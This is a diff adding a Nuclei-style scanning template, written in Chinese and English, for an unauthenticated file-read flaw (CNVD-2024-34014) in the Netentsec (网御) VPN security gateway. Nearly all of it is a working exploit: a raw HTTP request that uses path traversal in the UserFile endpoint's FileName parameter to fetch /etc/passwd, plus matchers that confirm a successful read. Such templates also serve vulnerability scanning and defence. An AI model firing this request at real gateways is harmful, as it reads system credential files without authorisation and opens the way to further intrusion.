@@ -1,0 +1,29 @@
+id: netentsec-vpn-userfile-download
+
+info:
+  name: "网御VPN安全网关 UserFile 接口未授权文件读取漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    网御VPN安全网关的UserFile接口存在未经验证的文件访问漏洞，攻击者可通过构造恶意请求下载系统敏感文件（如/etc/passwd）。该缺陷源于接口未正确校验用户身份及文件访问权限，可能导致系统凭证信息泄露。攻击者无需认证即可直接利用该漏洞获取敏感数据，进而实施后续攻击。
+  reference:
+  - CNVD-2024-34014
+  tags: 网御VPN安全网关
+
+http:
+- raw:
+  - |
+    GET /SSL/admin/UserFile?FileName=../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/javascript, */*; q=0.01
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
